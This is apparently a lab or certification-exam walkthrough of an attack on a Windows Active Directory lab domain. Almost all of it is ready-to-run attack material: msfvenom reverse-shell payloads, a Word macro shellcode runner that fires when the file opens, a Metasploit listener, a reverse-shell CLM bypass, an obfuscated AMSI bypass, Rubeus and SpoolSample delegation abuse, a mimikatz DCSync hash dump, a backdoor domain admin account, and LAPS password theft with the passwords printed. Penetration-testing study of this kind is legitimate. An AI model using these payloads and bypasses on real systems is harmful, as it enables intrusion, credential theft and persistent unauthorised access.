# Challenge 1

## Enumeration

### 192.168.100.120

```
Open 192.168.100.120:53
Open 192.168.100.120:88
Open 192.168.100.120:135
Open 192.168.100.120:139
Open 192.168.100.120:389
Open 192.168.100.120:445
Open 192.168.100.120:464
Open 192.168.100.120:593
Open 192.168.100.120:636
Open 192.168.100.120:3268
Open 192.168.100.120:3269
Open 192.168.100.120:3389
Open 192.168.100.120:5985
Open 192.168.100.120:9389
Open 192.168.100.120:49667
Open 192.168.100.120:49680
Open 192.168.100.120:49681
Open 192.168.100.120:49685
Open 192.168.100.120:49705
Open 192.168.100.120:49722
```

### 192.168.100.121

#### Open Ports

```
PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack
135/tcp  open  msrpc         syn-ack
445/tcp  open  microsoft-ds  syn-ack
3389/tcp open  ms-wbt-server syn-ack
```

#### Web Page

Navigating to http://192.168.100.21 shows a file upload

<figure><img src="../../../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

### 192.168.100.122

Domain Administrator

```powershell
# Exploit Unconstrained Delegation on web05
# Monitoring TGT from CDC01$ with Rubeus
Rubeus.exe monitor /interval:5 /filteruser:dc03$
# Initiate print spooler change notification
SpoolSample.exe dc03 WEB05
# Injecting TGT with Rubeus
Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
# Executing DCSync as CDC01$ with Mimikatz to dump domain administrator hash
lsadump::dcsync /domain:inifity.com /user:administrator
```

Administrator on client.infinity.com

```powershell
# In domain administrator session
# Create a new user
net user haxor P@ssw0rd /add /domain
# Add user to Remote Desktop Users group
net localgroup "Remote Desktop Users" haxor /add /domain
# Add user to the Domain Administrators group
net group "domain admins" haxor /add /domain
```

## Exploit File Upload

In Kali generate some shellcode

```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.49.100 LPORT=443 -f csharp
```

Connect to development machine with remote desktop

```bash
# Connect to development machine with remote desktop
remmina rdp://192.168.100.100
# On Development map network drive
net use x: \\192.168.49.100\visualstudio /user:kali @WSX2wsx
```

Open the project `X:\OSEP\EncryptedShellCodeRunnerHelperVBA\EncryptedShellCodeRunnerHelperVBA.sln` in Visual Studio and click on the Program.cs file.&#x20;

Paste the shell code into the file and select Build -> Build Solution.

Run the file `X:\OSEP\EncryptedShellCodeRunnerHelperVBA\EncryptedShellCodeRunnerHelperVBA\bin\x64\Release\EncryptedShellCodeRunnerHelperVBA.exe` to generate the encrypted shellcode.&#x20;

Open Microsoft Word, create a new macro and paste in the below VB script.&#x20;

{% code overflow="wrap" %}
```visual-basic
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Sub MyMacro()
Dim buf As Variant
Dim addr As LongPtr
Dim counter As Long
Dim data As Long
Dim res As Long
buf = Array(EncryptedShellCode)
For i = 0 To UBound(buf)
buf(i) = buf(i) - 2
Next i
addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
For counter = LBound(buf) To UBound(buf)
data = buf(counter)
res = RtlMoveMemory(addr + counter, data, 1)
Next counter
res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub
Sub Document_Open()
MyMacro
End Sub
Sub AutoOpen()
MyMacro
End Sub
```
{% endcode %}

Paste in the shellcode that was encrypted with the binary as shown below.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Save the document as type Work Macro-Enabled Document.&#x20;

In metaspoloit on the Kali host setup a listener

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lport 443
set exitfunc thread
run
```

Copy word document to Kali host and upload to the website.

<figure><img src="../../../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

## CLM Bypass

{% code overflow="wrap" %}
```powershell
# Upload PsBypassCLM.exe with meterpreter
upload /home/kali/share/PsBypassCLM.exe C:\\Windows\\Tasks\\psbypassclm.exe
# Bypass CLM
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=192.168.49.100 /rport=53 /U C:\Windows\Tasks\psbypassclm.exe
# Verify it is now FullLanguage mode
$ExecutionContext.SessionState.LanguageMode
```
{% endcode %}

## Bypass AMSI

{% code overflow="wrap" %}
```powershell
# Verify AMSI is in place
'amsiutils'
# Run AMSI bypass
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)
# Verify AMSI has been bypassed
'amsiutils'
```
{% endcode %}

## Domain Enumeration

{% code overflow="wrap" %}
```powershell
# Map Network Drive
$username = "kali"                                                                                                                        
$password = "@WSX2wsx"                                                                                                                     
$pwdSecureString = ConvertTo-SecureString -Force -AsPlainText $password
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $userName, $pwdSecureString
New-PSDrive -Name "X" -Root "\\192.168.49.100\visualstudio" -Persist -PSProvider "FileSystem" -Credential $Credential
# Run SharpHound from network share
gc -raw X:\share\PowerSharpPack\PowerSharpBinaries\Invoke-SharpHound4.ps1 | iex | Invoke-SharpHound4
```
{% endcode %}

In Bloodhound mark user Ted as owned. Then select query `Shortest Path from Owned Principals`

<figure><img src="../../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Ted can read the LAPS password for both web05 and client.&#x20;

## LAPS

```powershell
# Import Powerview module
gc -raw X:\share\PowerView.ps1 | iex
# Get the local administrator password for web05
Get-DomainObject web05 -Properties "ms-mcs-AdmPwd",name
Get-DomainObject client -Properties "ms-mcs-AdmPwd",name

PS > Get-DomainObject web05 -Properties "ms-mcs-AdmPwd",name

name  ms-mcs-admpwd 
----  ------------- 
WEB05 ]StCu$J21)(3}@



PS > Get-DomainObject client -Properties "ms-mcs-AdmPwd",name

name   ms-mcs-admpwd 
----   ------------- 
CLIENT 2%JOQ!)oCcM/}7

```

## WEB05

```powershell
# RDP to host using LAPS credentials
remmina rdp://192.168.100.121

```
